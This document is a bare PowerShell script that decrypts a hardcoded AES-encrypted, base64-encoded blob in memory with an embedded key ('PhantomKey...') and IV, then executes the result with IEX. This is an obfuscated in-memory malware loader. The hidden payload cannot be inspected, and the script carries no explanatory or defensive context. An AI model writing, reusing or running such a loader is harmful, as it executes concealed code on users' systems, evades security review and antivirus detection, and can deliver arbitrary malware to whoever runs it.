$key = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
$enc = "rZWLNLcpuMnGExephNEDAeqtl3Ef/Xx3oYUihu5cMvV/vDt/3A1b6rauTffGeL7uNyUPkUzngszbz7PqqzZJ0v/s9+cxho1oHp2SWRERucNYwtZYK8sznXnXhee9KR54G6eD9PWttjO9Vz/W+McgNsIHbkGOn0qHUg8APkW9vwlBESSIwfje7eJM8SlKCDorRdYeiEleTwqYv/08TMX24dkGO3zxrHIbrLJzcd/u+Rl9svTHZqtmsP1rjucpedQ1FMtsNintRQPTBaCXnDrox65cztU8ZdyT8X0dgKUNfhpG4avLim+SBAJvDJLfwRYPYpcP7cbwhKhU3CI1ZKIe2c1jFyCt2zr6L/1Jb7IPIXgXIVoTMv0Fek9M273IK0SDcRENib/fSJ1CjDSSXQkmvfemrGGo2KjjZf3NPLcNdVhhELcg6xneyhwYkLX/am3+fZ8um0v9XXm0Npiy9ocfuAREYYh655ZaDhDpkKeHhYsQTaWO+uJnFLLyC1n9mrCKtkdr0wneZDFXb5MKMUi22eklMsmhLl2dzgO/HiigvxVqQ4/iZraTVaydM4wX00N5RBcjI3m239Xsvx3kAeqBPg/zEwxTDByAVu7SBqm7+YmYMPRc7hyQn3ektD0iIVblrmHf+h4vmlxqP0uOv2Vpe9zugdzMYemoDOGOBwA/ax+VJ6NV79Ug5iKgIIEK8fzzYiVY+ra9fXkqyNGd5eCXl+GXA/dqep2WOtpN9N/JyWFsV7hU59nCo9fxpHXhGXOUi1zNTUT98wHv1NIpNRYqhecWaI4HXPWfgCDoKixoQ01ib27p9CQx9Zao+pWc4W9FddnMNdLWOqJoLFfpjlqAIdFtQ2nU/HNdsQ4iFUydw9M1PYr7LCYa/hZdNbCFUozxDIkgAs0PUg2tJTf7tDq+BfX6fuNM7KoHmzukxC3AJaJ0qNPfFAX563vNIrztQBrxgTQj2yhVVHqqbEECMj9ljnyiC/1nN9iakWcsvAc13zA="
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($enc))
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object System.IO.StreamReader($cs)
$decryptedScript = $sr.ReadToEnd()
$sr.Close();$cs.Close();$ms.Close()
IEX $decryptedScript
